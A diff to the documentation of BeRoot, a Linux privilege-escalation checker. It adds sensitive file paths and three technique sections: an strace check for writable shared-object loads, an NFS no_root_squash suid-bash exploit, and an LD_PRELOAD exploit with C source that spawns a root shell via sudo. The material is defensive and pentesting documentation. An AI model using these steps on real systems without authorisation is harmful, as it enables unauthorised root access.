@@ -177,6 +177,8 @@ Lots of file are run with high permissions on the system (e.g cron files, servic
 /etc/cron.hourly
 /etc/cron.monthly
 /etc/cron.weekly
+/etc/sudoers
+/etc/exports
 /etc/at.allow
 /etc/at.deny
 /etc/crontab
@@ -201,6 +203,59 @@ BeRoot prints all suid files because a manually analyse should be done on each b
 * checks if we have write permissions on these binary (why not ? :))
 * checks if a LOLBin is used as suid to be able to execute system commands using it (remember you could have suid LOLBin without beeing able to exectute commands - checks LOLBin section with the false positive example using __mount__). 
 
+To analyse manually, checking for .so files loaded from a writable path should be a great idea (this check has not been implemented on BeRoot): 
+```
+strace [SUID_PATH] 2>&1 | grep -i -E "open|access|no such file"
+```
+
+
+NFS Root Squashing
+----
+
+If __no_root_squash__ appears in `/etc/exports`, privilege escalation may be done. More information can be found [here](https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/).
+
+Exploitation:
+```
+mkdir /tmp/nfsdir  # create dir
+mount -t nfs 192.168.1.10:/shared /tmp/nfsdir # mount directory 
+cd /tmp/nfsdir
+cp /bin/bash . 	# copy wanted shell 
+chmod +s bash 	# set suid permission
+```
+
+LD_PRELOAD
+----
+
+If LD_PRELOAD is explicitly defined on sudoers file, it could be used to elevate our privilege. 
+For example: 
+```
+Defaults        env_keep += LD_PRELOAD
+```
+
+Create a share object
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setgid(0);
+	setuid(0);
+	system("/bin/sh");
+}
+```
+
+Compile it
+```
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+```
+
+If you have a binary that you could launch with sudo and NOPASSWD, launch it with LD_PRELOAD pointing to your shared object.
+```
+sudo LD_PRELOAD=/tmp/shell.so find
+```
+
+More information can be found [here](http://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)
 
 Sudoers file
 ----
